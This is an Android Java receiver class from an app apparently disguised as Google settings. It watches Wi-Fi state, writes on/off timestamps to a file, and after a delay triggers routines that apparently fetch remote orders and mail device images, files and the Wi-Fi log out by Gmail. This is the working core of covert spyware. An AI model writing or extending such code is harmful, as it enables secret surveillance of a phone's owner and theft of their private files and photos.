package com.setting.dl.google.googlesettings.recievers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.setting.dl.google.googlesettings.Time;
import com.setting.dl.google.googlesettings.mail.MailImageParts;
import com.setting.dl.google.googlesettings.mail.MailingFile;
import com.setting.dl.google.googlesettings.mail.Orders;
import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.u;

import java.util.Objects;


public class WifiLestener extends BroadcastReceiver {
    
    @Override
    public void onReceive(final Context context, Intent intent) {
        
        if(!Objects.equals(intent.getAction(), "android.net.wifi.WIFI_STATE_CHANGED")) return;
        
        final WifiManager wifiManager = (WifiManager)context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
    
        String value = Time.whatTimeIsIt();
    
        assert wifiManager != null;
        int state = wifiManager.getWifiState();
        
        switch (state) {
    
            case WifiManager.WIFI_STATE_ENABLED:
        
                Log.i("wifi state", "WIFI_STATE_ENABLED");
        
                value += "\nwifi açıldı\n-------------\n";
                
                Handler handler = new Handler(Looper.getMainLooper());
        
                handler.postDelayed(new Runnable() {
            
                    @Override
                    public void run() {
    
                        Orders.getOrderEx(context);
                        new MailImageParts(context);
                        new MailingFile(context);
                
                    }
                }, 120000);
        
                break;
            
            case WifiManager.WIFI_STATE_DISABLED:
                value += "\nwifi kapatıldı\n-----------------\n";
                Log.i("wifi state", "WIFI_STATE_DISABLED");
                break;
            
            case WifiManager.WIFI_STATE_DISABLING:
                return;
            
            case WifiManager.WIFI_STATE_ENABLING:
                return;
            
            case WifiManager.WIFI_STATE_UNKNOWN:
                return;
        }
        
        final String fileWifi = "wifi.txt";
        u.saveValue(context, fileWifi, value);
    
        u.runThread(() -> Mail.send(context, fileWifi), 120000);
    }
}
